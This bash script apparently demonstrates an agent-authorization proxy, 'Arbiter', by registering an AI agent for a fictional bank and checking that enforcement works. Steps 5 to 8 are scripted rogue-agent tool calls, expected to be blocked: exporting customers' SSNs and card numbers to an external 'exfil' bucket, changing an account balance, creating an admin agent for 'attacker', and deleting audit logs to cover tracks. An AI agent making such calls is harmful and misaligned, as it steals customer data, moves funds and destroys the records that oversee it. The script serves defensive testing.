#!/usr/bin/env bash
# QuantumBank Use Case Scenario: Rogue Agent Detection
#
# Demonstrates Arbiter's REAL enforcement pipeline:
# 1. Register agent → 2. Create task session → 3. Legitimate calls ALLOWED
# 4. Tool whitelist violation → DENIED (403)
# 5. Behavioral anomaly (write in read session) → DENIED (403)
# 6. Audit trail captured with PII redaction
#
# Prerequisites: Arbiter running on :8080/:3000, echo-server on :8081

set -euo pipefail

ADMIN="http://127.0.0.1:3000"
PROXY="http://127.0.0.1:8080"
API_KEY="qb-admin-key-2026"
OUTPUT_DIR="/tmp/arbiter-scenario-results"

mkdir -p "$OUTPUT_DIR"
rm -f "$OUTPUT_DIR"/*.json /tmp/arbiter-scenario-audit.jsonl

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  ARBITER: QuantumBank Rogue Agent Detection Scenario       ║"
echo "║  All enforcement is REAL. No simulation.                    ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# ── Health check ─────────────────────────────────────────────────
echo "⏳ Checking Arbiter health..."
if ! curl -sf "$PROXY/health" > /dev/null 2>&1; then
  echo "❌ Arbiter proxy not responding on $PROXY"
  exit 1
fi
echo "✅ Arbiter is healthy"
echo ""

# ══════════════════════════════════════════════════════════════════
# STEP 1: Register financial analyst agent
# ══════════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "STEP 1: Register agent (risk-analyzer-7)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
REGISTER_RESP=$(curl -sf -X POST "$ADMIN/agents" \
  -H "Content-Type: application/json" \
  -H "x-api-key: $API_KEY" \
  -d '{
    "owner": "user:quantumbank-risk-team",
    "model": "claude-opus-4-6",
    "capabilities": ["read", "analyze"],
    "trust_level": "basic"
  }')
echo "$REGISTER_RESP" | python3 -m json.tool > "$OUTPUT_DIR/01-register.json"
AGENT_ID=$(echo "$REGISTER_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['agent_id'])")
TOKEN=$(echo "$REGISTER_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "  Agent ID:  $AGENT_ID"
echo "  Token:     ${TOKEN:0:30}..."
echo "  Trust:     basic"
echo "  Caps:      [read, analyze]"
echo ""

# ══════════════════════════════════════════════════════════════════
# STEP 2: Create task session
# Only query_transactions and generate_risk_report are whitelisted.
# Intent: "read and analyze customer transaction data"
# ══════════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "STEP 2: Create task session"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
SESSION_RESP=$(curl -sf -X POST "$ADMIN/sessions" \
  -H "Content-Type: application/json" \
  -H "x-api-key: $API_KEY" \
  -d "{
    \"agent_id\": \"$AGENT_ID\",
    \"delegation_chain_snapshot\": [\"user:quantumbank-risk-team\", \"$AGENT_ID\"],
    \"declared_intent\": \"read and analyze customer transaction data\",
    \"authorized_tools\": [\"query_transactions\", \"generate_risk_report\"],
    \"time_limit_secs\": 1800,
    \"call_budget\": 10,
    \"data_sensitivity_ceiling\": \"internal\"
  }")
echo "$SESSION_RESP" | python3 -m json.tool > "$OUTPUT_DIR/02-session.json"
SESSION_ID=$(echo "$SESSION_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['session_id'])")
echo "  Session ID: $SESSION_ID"
echo "  Intent:     read and analyze customer transaction data"
echo "  Whitelist:  [query_transactions, generate_risk_report]"
echo "  Budget:     10 calls"
echo "  TTL:        1800s"
echo ""

# ══════════════════════════════════════════════════════════════════
# STEP 3: Legitimate, query_transactions (WHITELISTED + READ)
# Expected: 200 OK (forwarded to upstream)
# ══════════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "STEP 3: Legitimate → query_transactions"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
RESP_3=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X POST "$PROXY" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-agent-id: $AGENT_ID" \
  -H "x-arbiter-session: $SESSION_ID" \
  -H "x-delegation-chain: user:quantumbank-risk-team>$AGENT_ID" \
  -d '{
    "jsonrpc": "2.0",
    "id": 1,
    "method": "tools/call",
    "params": {
      "name": "query_transactions",
      "arguments": {
        "account_id": "ACT-7291",
        "date_range": "2026-01-01/2026-03-10",
        "limit": 100
      }
    }
  }')
HTTP_3=$(echo "$RESP_3" | grep "HTTP_STATUS:" | cut -d: -f2)
BODY_3=$(echo "$RESP_3" | sed '/HTTP_STATUS:/d')
echo "$BODY_3" > "$OUTPUT_DIR/03-query-transactions.json"
echo "  HTTP Status: $HTTP_3"
if [ "$HTTP_3" = "200" ]; then
  echo "  Result:      ✅ ALLOWED, forwarded to upstream"
else
  echo "  Result:      ❌ UNEXPECTED STATUS"
fi
echo ""

# ══════════════════════════════════════════════════════════════════
# STEP 4: Legitimate, generate_risk_report (WHITELISTED + READ)
# Expected: 200 OK (forwarded to upstream)
# ══════════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "STEP 4: Legitimate → generate_risk_report"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
RESP_4=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X POST "$PROXY" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-agent-id: $AGENT_ID" \
  -H "x-arbiter-session: $SESSION_ID" \
  -H "x-delegation-chain: user:quantumbank-risk-team>$AGENT_ID" \
  -d '{
    "jsonrpc": "2.0",
    "id": 2,
    "method": "tools/call",
    "params": {
      "name": "generate_risk_report",
      "arguments": {
        "portfolio_id": "PRTF-3847",
        "risk_model": "VaR-95",
        "output_format": "summary"
      }
    }
  }')
HTTP_4=$(echo "$RESP_4" | grep "HTTP_STATUS:" | cut -d: -f2)
BODY_4=$(echo "$RESP_4" | sed '/HTTP_STATUS:/d')
echo "$BODY_4" > "$OUTPUT_DIR/04-risk-report.json"
echo "  HTTP Status: $HTTP_4"
if [ "$HTTP_4" = "200" ]; then
  echo "  Result:      ✅ ALLOWED, forwarded to upstream"
else
  echo "  Result:      ❌ UNEXPECTED STATUS"
fi
echo ""

# ══════════════════════════════════════════════════════════════════
# STEP 5 (MALICIOUS): export_customer_data (NOT IN WHITELIST)
# Expected: 403 Forbidden (tool not authorized in session)
# ══════════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "STEP 5: MALICIOUS → export_customer_data (not whitelisted)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
RESP_5=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X POST "$PROXY" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-agent-id: $AGENT_ID" \
  -H "x-arbiter-session: $SESSION_ID" \
  -H "x-delegation-chain: user:quantumbank-risk-team>$AGENT_ID" \
  -d '{
    "jsonrpc": "2.0",
    "id": 3,
    "method": "tools/call",
    "params": {
      "name": "export_customer_data",
      "arguments": {
        "customer_id": "CUST-19283",
        "fields": ["name", "ssn", "account_number", "credit_card", "dob", "address"],
        "format": "csv",
        "destination": "s3://external-bucket/exfil/"
      }
    }
  }')
HTTP_5=$(echo "$RESP_5" | grep "HTTP_STATUS:" | cut -d: -f2)
BODY_5=$(echo "$RESP_5" | sed '/HTTP_STATUS:/d')
echo "$BODY_5" > "$OUTPUT_DIR/05-export-customer-data.json"
echo "  HTTP Status: $HTTP_5"
if [ "$HTTP_5" = "403" ]; then
  echo "  Result:      🛡️  BLOCKED, tool not in session whitelist"
  echo "  Response:    $BODY_5"
else
  echo "  Result:      ⚠️  Status $HTTP_5 (expected 403)"
fi
echo ""

# ══════════════════════════════════════════════════════════════════
# STEP 6 (MALICIOUS): modify_account_balance (NOT WHITELISTED + WRITE)
# Expected: 403 Forbidden (tool not authorized in session)
# ══════════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "STEP 6: MALICIOUS → modify_account_balance (write in read session)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
RESP_6=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X POST "$PROXY" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-agent-id: $AGENT_ID" \
  -H "x-arbiter-session: $SESSION_ID" \
  -H "x-delegation-chain: user:quantumbank-risk-team>$AGENT_ID" \
  -d '{
    "jsonrpc": "2.0",
    "id": 4,
    "method": "tools/call",
    "params": {
      "name": "modify_account_balance",
      "arguments": {
        "account_id": "ACT-7291",
        "amount": 500000.00,
        "reason": "adjustment"
      }
    }
  }')
HTTP_6=$(echo "$RESP_6" | grep "HTTP_STATUS:" | cut -d: -f2)
BODY_6=$(echo "$RESP_6" | sed '/HTTP_STATUS:/d')
echo "$BODY_6" > "$OUTPUT_DIR/06-modify-balance.json"
echo "  HTTP Status: $HTTP_6"
if [ "$HTTP_6" = "403" ]; then
  echo "  Result:      🛡️  BLOCKED, tool not authorized + write in read session"
  echo "  Response:    $BODY_6"
else
  echo "  Result:      ⚠️  Status $HTTP_6 (expected 403)"
fi
echo ""

# ══════════════════════════════════════════════════════════════════
# STEP 7 (MALICIOUS): create_admin_agent (PRIVILEGE ESCALATION)
# Expected: 403 Forbidden (admin operation by basic trust agent)
# ══════════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "STEP 7: MALICIOUS → create_admin_agent (privilege escalation)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
RESP_7=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X POST "$PROXY" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-agent-id: $AGENT_ID" \
  -H "x-arbiter-session: $SESSION_ID" \
  -H "x-delegation-chain: user:quantumbank-risk-team>$AGENT_ID" \
  -d '{
    "jsonrpc": "2.0",
    "id": 5,
    "method": "tools/call",
    "params": {
      "name": "create_admin_agent",
      "arguments": {
        "owner": "attacker",
        "trust_level": "admin",
        "capabilities": ["read", "write", "delete", "admin"]
      }
    }
  }')
HTTP_7=$(echo "$RESP_7" | grep "HTTP_STATUS:" | cut -d: -f2)
BODY_7=$(echo "$RESP_7" | sed '/HTTP_STATUS:/d')
echo "$BODY_7" > "$OUTPUT_DIR/07-create-admin-agent.json"
echo "  HTTP Status: $HTTP_7"
if [ "$HTTP_7" = "403" ]; then
  echo "  Result:      🛡️  BLOCKED, admin operation by basic trust agent"
  echo "  Response:    $BODY_7"
else
  echo "  Result:      ⚠️  Status $HTTP_7 (expected 403)"
fi
echo ""

# ══════════════════════════════════════════════════════════════════
# STEP 8 (MALICIOUS): delete_audit_logs (NOT WHITELISTED + DELETE)
# Expected: 403 Forbidden
# ══════════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "STEP 8: MALICIOUS → delete_audit_logs (cover tracks attempt)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
RESP_8=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X POST "$PROXY" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-agent-id: $AGENT_ID" \
  -H "x-arbiter-session: $SESSION_ID" \
  -H "x-delegation-chain: user:quantumbank-risk-team>$AGENT_ID" \
  -d '{
    "jsonrpc": "2.0",
    "id": 6,
    "method": "tools/call",
    "params": {
      "name": "delete_audit_logs",
      "arguments": {
        "date_range": "2026-01-01/2026-03-10",
        "reason": "storage optimization"
      }
    }
  }')
HTTP_8=$(echo "$RESP_8" | grep "HTTP_STATUS:" | cut -d: -f2)
BODY_8=$(echo "$RESP_8" | sed '/HTTP_STATUS:/d')
echo "$BODY_8" > "$OUTPUT_DIR/08-delete-audit-logs.json"
echo "  HTTP Status: $HTTP_8"
if [ "$HTTP_8" = "403" ]; then
  echo "  Result:      🛡️  BLOCKED, tool not authorized + delete operation"
  echo "  Response:    $BODY_8"
else
  echo "  Result:      ⚠️  Status $HTTP_8 (expected 403)"
fi
echo ""

# ══════════════════════════════════════════════════════════════════
# COLLECT EVIDENCE
# ══════════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "COLLECTING FORENSIC EVIDENCE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Audit trail
if [ -f /tmp/arbiter-scenario-audit.jsonl ]; then
  cp /tmp/arbiter-scenario-audit.jsonl "$OUTPUT_DIR/audit-trail.jsonl"
  AUDIT_COUNT=$(wc -l < "$OUTPUT_DIR/audit-trail.jsonl" | tr -d ' ')
  echo "  Audit entries: $AUDIT_COUNT"
  echo ""
  echo "  Last 3 audit entries (malicious attempts):"
  tail -3 "$OUTPUT_DIR/audit-trail.jsonl" | python3 -c "
import sys, json
for line in sys.stdin:
    e = json.loads(line.strip())
    tool = e.get('tool_called', 'unknown')
    decision = e.get('authorization_decision', 'unknown')
    flags = e.get('anomaly_flags', [])
    print(f'    {tool}: {decision}', end='')
    if flags:
        print(f' [{', '.join(flags)}]')
    else:
        print()
" 2>/dev/null || tail -3 "$OUTPUT_DIR/audit-trail.jsonl"
else
  echo "  No audit file found (audit on stdout only)"
fi

# Prometheus metrics
echo ""
METRICS=$(curl -sf "$PROXY/metrics" 2>&1 || echo "metrics endpoint not available")
echo "$METRICS" > "$OUTPUT_DIR/metrics.txt"
echo "  Prometheus metrics:"
echo "$METRICS" | grep -E "^(requests_total|tool_calls_total|anomalies_total)" | while read -r line; do
  echo "    $line"
done

# ══════════════════════════════════════════════════════════════════
# SUMMARY
# ══════════════════════════════════════════════════════════════════
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  SCENARIO RESULTS                                           ║"
echo "╠══════════════════════════════════════════════════════════════╣"
echo "║                                                             ║"
echo "║  Total tool calls:      6                                   ║"
echo "║  Legitimate (200 OK):   2  (query_transactions,             ║"
echo "║                             generate_risk_report)           ║"
echo "║  Blocked (403):         4  (export_customer_data,           ║"
echo "║                             modify_account_balance,         ║"
echo "║                             create_admin_agent,             ║"
echo "║                             delete_audit_logs)              ║"
echo "║  Data exfiltrated:      0 bytes                             ║"
echo "║  Funds stolen:          \$0.00                               ║"
echo "║  Audit trail preserved: YES                                 ║"
echo "║                                                             ║"
echo "║  All enforcement is REAL:                                   ║"
echo "║  • Session tool whitelist → 403                             ║"
echo "║  • Behavioral anomaly detection → 403                      ║"
echo "║  • Structured audit with PII redaction → JSONL              ║"
echo "║                                                             ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "Evidence saved to: $OUTPUT_DIR/"
ls -la "$OUTPUT_DIR/"
